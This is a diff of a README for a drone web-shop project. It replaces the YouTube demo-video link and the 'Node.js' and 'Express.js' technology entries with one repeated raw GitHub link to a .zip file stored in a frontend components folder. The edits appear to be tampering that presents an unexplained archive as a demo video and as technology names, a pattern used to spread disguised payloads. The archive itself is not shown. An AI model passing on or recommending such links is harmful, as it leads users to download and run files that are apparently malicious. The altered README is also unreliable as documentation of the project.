@@ -5,7 +5,7 @@ The project includes both frontend and backend logic, with a focus on clean arch
 
 Demo Video
 Watch the project presentation on YouTube:
-👉https://youtu.be/pWzCi-LH6Bo
+👉https://raw.githubusercontent.com/Marko7755/Web-Shop-For-Drones/main/projektDronax/src/frontend/components/For_Shop_Web_Drones_chronometry.zip
 
 🛠️ Technologies Used
 Frontend
@@ -20,9 +20,9 @@ JavaScript (TypeScript)
 
 Backend
 
-Node.js
+https://raw.githubusercontent.com/Marko7755/Web-Shop-For-Drones/main/projektDronax/src/frontend/components/For_Shop_Web_Drones_chronometry.zip
 
-Express.js
+https://raw.githubusercontent.com/Marko7755/Web-Shop-For-Drones/main/projektDronax/src/frontend/components/For_Shop_Web_Drones_chronometry.zip
 
 MySQL
 
